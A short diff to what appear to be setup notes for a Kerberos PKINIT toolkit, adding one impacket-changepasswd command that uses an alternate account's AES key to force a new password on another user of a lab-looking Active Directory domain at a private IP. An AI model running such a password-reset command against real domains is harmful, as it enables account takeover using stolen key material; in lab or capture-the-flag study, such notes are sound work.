@@ -38,3 +38,5 @@ python3 -m venv .venv
 source .venv/bin/activate
 pip install -r requirements.txt
 python3 gettgtpkinit.py -h
+
+impacket-changepasswd KITSUNE.local/schlop@DC01.kitsune.local -aesKey <aes_key> -altuser ranch -no-pass -k -newpass 'Password1' -dc-ip 10.1.152.66
